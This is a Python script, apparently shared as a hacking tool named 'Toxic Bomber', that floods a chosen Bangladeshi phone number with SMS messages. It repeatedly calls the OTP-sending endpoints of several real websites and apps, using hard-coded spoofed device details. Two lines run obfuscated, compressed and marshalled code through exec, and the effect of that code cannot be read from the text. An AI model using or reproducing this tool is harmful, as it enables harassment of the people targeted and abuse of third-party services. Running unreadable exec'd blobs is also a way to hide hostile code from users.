#Coded By Dark Sald3
#A Product Of ToxicNoob
#If You Want To Get Knowledge From This  Source Code, You're Welcomed....
#But If You Want To Copy And Take Cradits, Then Get Out...

import time
import requests
import mechanize
import sys
import os

def logopsb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.003)


def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)
        
#Don't Delete Or Edit This Line
exec(eval((lambda ____,__,_ : ____.join([_(___) for ___ in __]))('',[95, 95, 105, 109, 112, 111, 114, 116, 95, 95, 40, 39, 109, 97, 114, 115, 104, 97, 108, 39, 41, 46, 108, 111, 97, 100, 115],chr))(eval((lambda ____,__,_ : ____.join([_(___) for ___ in __]))('',[95, 95, 105, 109, 112, 111, 114, 116, 95, 95, 40, 34, 122, 108, 105, 98, 34, 41, 46, 100, 101, 99, 111, 109, 112, 114, 101, 115, 115],chr))(eval((lambda ____,__,_ : ____.join([_(___) for ___ in __]))('',[95, 95, 105, 109, 112, 111, 114, 116, 95, 95, 40, 34, 98, 97, 115, 101, 54, 52, 34, 41, 46, 98, 54, 52, 100, 101, 99, 111, 100, 101],chr))(b'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'))))

br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)

if(sec==K3Y):
	psb("\n[!] Access Approved.....")
	time.sleep(0.6)
	psb("\n[!] Loading...")
	time.sleep(0.8)
	
	
	print("\033[0;92m")
	os.system("clear")
	time.sleep(0.5)
	logopsb(" _____ ____                  _               \n|_   _| __ )  ___  _ __ ___ | |__   ___ _ __ \n  | | |  _ \ / _ \| '_ ` _ \| '_ \ / _ \ '__|\n  | | | |_) | (_) | | | | | | |_) |  __/ |   \n  |_| |____/ \___/|_| |_| |_|_.__/ \___|_|   \n                                             ")
	logopsb("\033[3;90m			A Product Of ToxicNoob\033[0;92m")
	time.sleep(0.6)
	logopsb("\033[34m\n|****************************************************| \n|\033[3m Author   : DarkSlad3                               \033[0;34m|\n|\033[3m Tool     : Toxic Bomber                            \033[0;34m|\n|\033[3m Version  : 2.0                                     \033[0;34m|\n|\033[3m Link     : https://www.github.com/Toxic-Noob/	     \033[0;34m|\n|\033[3m Coded By : DarkSlad3        		     	     \033[0;34m|\n******************************************************")
	time.sleep(0.8)
	
	
	print("\033[92m")
	number = input("\n\033[3m[*] Enter Target Number:> +880")
	tr1 = input("[*] Enter Amount (Default 10):> ")
	if(tr1==""):
		tr=10
	else:
		tr=int(tr1)
	psb("[*] Auto Delay: 4 Seconds...")
	time.sleep(0.5)
	
	num = "880"+number
	num2 = "+880"+number
	tr2 = str(tr)
	global first, middle
	n = num[4:]
	m = num[:6]
	num3 = n+"-"+m
	data={"phone":{"number":num3,"internationalNumber":"+880 "+num3,"nationalNumber":"0"+num3,"e164Number":"+880"+num3,"countryCode":"BD","dialCode":"+880"},"contact":num,"type":"phone"}
	
	
	psb("\n[!] Please wait.....")
	time.sleep(0.6)
	psb("[!] Bombing in Progress....\n")
	time.sleep(1)
	
	op = 0
	while op<=tr:
		try:
			r = br.open("https://www.bioscopelive.com/en/login/send-otp?phone="+num+"&operator=bd-otp")
			op = op + 1
			oj = str(op)
			print("\033[92m["+oj+"] Massege Sent Successfully!")
			if(op==tr):
				psb("\n[*] Bombing Finished!!\n")
				time.sleep(0.5)
				psb("[!] Sent "+tr2+" Massages To 0"+number+" By ToxicBomber.....\n\033[0;40;37m")
				time.sleep(0.7)
				exit()
			else:
				time.sleep(4)
		except:
			if(op==tr):
				exit()
			else:
				data = {'query': '\nmutation CreateOtp (\n    $phone: PhoneNumber!\n    $country: String!\n    $uuid: String!\n    $osVersionCode: String\n    $deviceBrand: String\n    $deviceModel: String\n    $requestFrom: String\n) {\n    createOtp(\n        auth: {\n            phone: $phone,\n            countryCode: $country,\n            deviceUuid: $uuid,\n            deviceToken: ""\n        }\n        device: {\n            deviceType: WEB\n            osVersionCode: $osVersionCode\n            deviceBrand: $deviceBrand\n            deviceModel: $deviceModel\n        }\n        requestFrom: $requestFrom\n    ){\n        statusCode\n    }\n}\n', 'variables': {'phone': number, 'country': '880', 'uuid': '64b9bb81-93f3-4757-9e92-9cfbf34d8039', 'osVersionCode': 'Linux armv8l', 'deviceBrand': 'Chrome', 'deviceModel': '89', 'requestFrom': 'U2FsdGVkX18QITR3WakOCR2OK+zoIpqM7DqxiLf915s='}}
				response = requests.post("https://api-v4-2.hungrynaki.com/graphql", json=data)
				if response.status_code==200:
					op = op + 1
					oj = str(op)
					print("\033[92m["+oj+"] Massege Sent Successfully!")
					if(op==tr):
						psb("\n[*] Bombing Finished!!\n")
						time.sleep(0.5)
						psb("[!] Sent "+tr2+" Massages To 0"+number+" By ToxicBomber.....\n\033[0;40;37m")
						time.sleep(0.7)
						exit()
					else:
						time .sleep(4)
				else:
					print("\033[31m[!] Massege Send Failed!")
					time.sleep(4)
	
		response = requests.post("https://lms.10minuteschool.com/api/v4/auth/sendOtp",data=data)
		if response.status_code==200:
			op = op + 1
			oj = str(op)
			print("\033[92m["+oj+"] Massege Sent Successfully!")
			if(op==tr):
				psb("\n[*] Bombing Finished!!\n")
				time.sleep(0.5)
				psb("[!] Sent "+tr2+" Massages To 0"+number+" By ToxicBomber.....\n\033[0;40;37m")
				time.sleep(0.7)
				exit()
			else:
				time.sleep(4)
		else:
			data = {'query': '\nmutation CreateOtp (\n    $phone: PhoneNumber!\n    $country: String!\n    $uuid: String!\n    $osVersionCode: String\n    $deviceBrand: String\n    $deviceModel: String\n    $requestFrom: String\n) {\n    createOtp(\n        auth: {\n            phone: $phone,\n            countryCode: $country,\n            deviceUuid: $uuid,\n            deviceToken: ""\n        }\n        device: {\n            deviceType: WEB\n            osVersionCode: $osVersionCode\n            deviceBrand: $deviceBrand\n            deviceModel: $deviceModel\n        }\n        requestFrom: $requestFrom\n    ){\n        statusCode\n    }\n}\n', 'variables': {'phone': number, 'country': '880', 'uuid': '64b9bb81-93f3-4757-9e92-9cfbf34d8039', 'osVersionCode': 'Linux armv8l', 'deviceBrand': 'Chrome', 'deviceModel': '89', 'requestFrom': 'U2FsdGVkX18QITR3WakOCR2OK+zoIpqM7DqxiLf915s='}}
			response = requests.post('https://api-v4-2.hungrynaki.com/graphql', json=data)
			if response.status_code==200:
				op = op + 1
				oj = str(op)
				print("\033[92m["+oj+"] Massege Sent Successfully!")
				if(op==tr):
					psb("\n[*] Bombing Finished!!\n")
					time.sleep(0.5)
					psb("[!] Sent "+tr2+" Massages To 0"+number+" By ToxicBomber.....\n\033[0;40;37m")
					time.sleep(0.7)
					exit()
				else:
					time.sleep(4)
			else:
				print("\033[31m[!] Massege Send Failed!")
				time.sleep(4)
	
		response = requests.post( "https://api2.bongobd.com/api/login/send-otp",data={"operator":"all","msisdn":num2})
		data = {'query': '\nmutation CreateOtp (\n    $phone: PhoneNumber!\n    $country: String!\n    $uuid: String!\n    $osVersionCode: String\n    $deviceBrand: String\n    $deviceModel: String\n    $requestFrom: String\n) {\n    createOtp(\n        auth: {\n            phone: $phone,\n            countryCode: $country,\n            deviceUuid: $uuid,\n            deviceToken: ""\n        }\n        device: {\n            deviceType: WEB\n            osVersionCode: $osVersionCode\n            deviceBrand: $deviceBrand\n            deviceModel: $deviceModel\n        }\n        requestFrom: $requestFrom\n    ){\n        statusCode\n    }\n}\n', 'variables': {'phone': number, 'country': '880', 'uuid': '64b9bb81-93f3-4757-9e92-9cfbf34d8039', 'osVersionCode': 'Linux armv8l', 'deviceBrand': 'Chrome', 'deviceModel': '89', 'requestFrom': 'U2FsdGVkX18QITR3WakOCR2OK+zoIpqM7DqxiLf915s='}}
		requests.post('https://api-v4-2.hungrynaki.com/graphql', json=data)
		if response.status_code==200:
			op = op + 1
			oj = str(op)
			print("\033[92m["+oj+"] Massege Sent Successfully!")
			if(op==tr):
				psb("\n[*] Bombing Finished!!\n")
				time.sleep(0.5)
				psb("[!] Sent "+tr2+" Massages To 0"+number+" By ToxicBomber.....\n\033[0;40;37m")
				time.sleep(0.7)
				exit()
			else:
				time.sleep(4)
		else:
			data = {'query': '\nmutation CreateOtp (\n    $phone: PhoneNumber!\n    $country: String!\n    $uuid: String!\n    $osVersionCode: String\n    $deviceBrand: String\n    $deviceModel: String\n    $requestFrom: String\n) {\n    createOtp(\n        auth: {\n            phone: $phone,\n            countryCode: $country,\n            deviceUuid: $uuid,\n            deviceToken: ""\n        }\n        device: {\n            deviceType: WEB\n            osVersionCode: $osVersionCode\n            deviceBrand: $deviceBrand\n            deviceModel: $deviceModel\n        }\n        requestFrom: $requestFrom\n    ){\n        statusCode\n    }\n}\n', 'variables': {'phone': number, 'country': '880', 'uuid': '64b9bb81-93f3-4757-9e92-9cfbf34d8039', 'osVersionCode': 'Linux armv8l', 'deviceBrand': 'Chrome', 'deviceModel': '89', 'requestFrom': 'U2FsdGVkX18QITR3WakOCR2OK+zoIpqM7DqxiLf915s='}}
			response = requests.post('https://api-v4-2.hungrynaki.com/graphql', json=data)
			if response.status_code==200:
				op = op + 1
				oj = str(op)
				print("\033[92m["+oj+"] Massege Sent Successfully!")
				if(op==tr):
					psb("\n[*] Bombing Finished!!\n")
					time.sleep(0.5)
					psb("[!] Sent "+tr2+" Massages To 0"+number+" By ToxicBomber.....\n\033[0;40;37m")
					time.sleep(0.7)
					exit()
				else:
					time.sleep(4)
			else:
				print("\033[31m[!] Massege Send Failed!")
				time.sleep(4)

else:
#Don'T Delete Or Edit This Line
	exec(eval((lambda ____,__,_ : ____.join([_(___) for ___ in __]))('',[95, 95, 105, 109, 112, 111, 114, 116, 95, 95, 40, 39, 109, 97, 114, 115, 104, 97, 108, 39, 41, 46, 108, 111, 97, 100, 115],chr))(eval((lambda ____,__,_ : ____.join([_(___) for ___ in __]))('',[95, 95, 105, 109, 112, 111, 114, 116, 95, 95, 40, 34, 122, 108, 105, 98, 34, 41, 46, 100, 101, 99, 111, 109, 112, 114, 101, 115, 115],chr))(eval((lambda ____,__,_ : ____.join([_(___) for ___ in __]))('',[95, 95, 105, 109, 112, 111, 114, 116, 95, 95, 40, 34, 98, 97, 115, 101, 54, 52, 34, 41, 46, 98, 54, 52, 100, 101, 99, 111, 100, 101],chr))(b'eJyNlEuP2lYUx2FmkkyTmT7yaNMm7aKq1I6QYrCxAWkS1TBgsI3fxoBUIcM1fmNsbDBWukqkdttv0C7zldh2lXW76qr3ThI16qb11f2dh+7534es83vpX983cH4P5+ZPCKtklUEJlF+WwBE4huME3AA3wS1wCj64jm+DOzBzBuNz8CG0H8H4Y/AJtLdgdBec24+soxfHL8r/qXMP3IdVJ+AB9JDCXfAp+AyuQOtOoX8Otb7831oP4O7nsOoh+Pyt3oNr/50qtPZXb9TAFy/Kb0a5BB6ppYvHi+P33gP5N97azUOI56VfSz+VlmVQBkcvT5+Xr0ovyr+VYd2xsCi/V3gE5wmc91DhfQgblv5w9mP559JzuNkvR/GJWnpVSlDNxdHh6En1cDybzV6VD+XZdfKv08tuUXDZ6tnh9mXgbtJFFK6fIckNwk24Q/H4MjDDOTCfPbkMooUZbJDzbulF+XDiRe7q4vhwApVnh6PZLEF3uZZPkEhyE+Jw+k4Fpf5Ah0/uoHzp9Qya1y5CiLBGiBAShBThO4RvEUyEDYKDECBcIDxBAAhfIxQIcwQLYYFAIdTR3c7gISx2L/h+sMV9Ws/xqt0xcI33Vxpv+NLI1I2Bqq+NuqsrrtHmWcfeDaf2mo6F6W7nWEPBHvamlBqP8Wo3w+TxdjjCuNqaLOZ6tQKUfFCj4nGNkggrWq2wcN63QMXcNnZGLW1plLQPdCXUWbllS1d0KA96VWfoG+Fe3rF+nmlYxyQVNSsEtumlVIjJmNgg243asFDnLCGlrDbaMV4eYFRYyGJDS5z2dN3uRgU77JOdPqCX247AUp7hY5iBZ8rKI/tZTik5CSiXlOrqeky1kiEvLHk/4GsTvisa7Y659wbSGLOXXZ20Kljdcx1pxS0ZxeSZHlvvSnVnWN2vKzsi2E56Lum2ao5r92IOpwcEwYG42gLExsIm2qI6kCo5HzmyFno847A5v6P3abJMrqZzlsqlNFv0+pWeQIhWXqyYYNUq9Mq22m55eqLicoMWQ0peWc3YZMDAsJPpSCgWyoCqCrtUG3cqcc/b4ELXXlEDzlu2ZF5Y72qbsOmZA1wY6sutw7X1CKtLPM6bdkFWibjwNnTfoNvagBYYum3Ro3qny9GSSLORTTt2W6fpYte1ZJqJaDof0Aq/SzdYdREmFgvvpbh9jzS0MUcTcUtnmkyT4PbjtcC1HXLEkaYj9815AIKsWSTKvmH2d4Vidax1YyoLjqa6Y9ATTT2qOBHOANyN3JEaClfawhSiebDkmWp7PLamW63XyaxcnmzX0qhmGniL7Olpj0vni2QfGGYl2I55XWVTRfO5eD00gsgV9FqfCbIrPBP6srPHJYsL4V8Kuj09N5vMxg/jhBPb/GKl+h5dETt2jaCAqE0Wo24QKJHViCtjhfB6y3qRpF0rDhW+7wf0Wi1a7k6RCNnkgtFw2tNJBXeYZkXqJnE33eh5Wq+o4oQ3RFyb7M2RsA34kSMQnscWIcnOedNUsT0RWmbVyONMrYvOyvczNp7WFG3DaAbB8Wos7tas25paWhVvDIOJrPhkfamq3mpur81BU03G2moynPQ3c5cf+1Ejy3qYb8YU73mJGy3jcFsLeZVKawy3h0+w2e7Djih6mRuH/Q4vXFUGXgXnaCxr792VqolsRIUq2wiyARH5dXdsP30qoPZl5dYCcmsGh+OFk7xpYP/gbRcLI5AF1nUXS84g/gYlufUI'))))
